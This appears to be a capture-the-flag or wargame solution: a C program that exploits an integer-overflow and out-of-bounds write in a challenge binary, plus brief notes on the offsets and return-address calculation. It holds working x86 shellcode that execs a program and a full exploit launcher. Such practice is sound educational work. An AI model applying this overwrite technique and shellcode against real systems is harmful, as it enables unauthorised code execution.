#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level6/6"

char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
	char *prm1 = "-1",
	     *prm2 = "\xb9 28",
	     *prm3 = "\xff 29",
	     *prm4 = "\xff 30",
	     *prm5 = "\xbf 31";
	char *prgwprm[] = {VULN, prm1, prm2, prm3, prm4, prm5, NULL};
	char *envp[] = {mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}

Steps:

-1 causes the buffer to be 0 (buffer = argv[1] + 1) - integer overflow, allows writing outside of buffer; 

<saved eip> found 28 bytes from the beginning of <buffer>, found through debugging the stripped program with GDB; 

Vulnerable program allows writing of bytes anywhere in (or outside) of buffer through appending placement, I.e. rewriting <saved eip> as return address of shellcode (as environment parameter), allowing execution of shellcode; 

Return address = 0xc0000000 – strln(VULN) - 8 (64bit) - 1 – machine_code_bytes – 1; 

Exploit program used, invoking execve, passing arguments and shellcode as environment parameter 

Shellcode Inspired by tinyshell.s from Hacking: The Art of Exploitation 

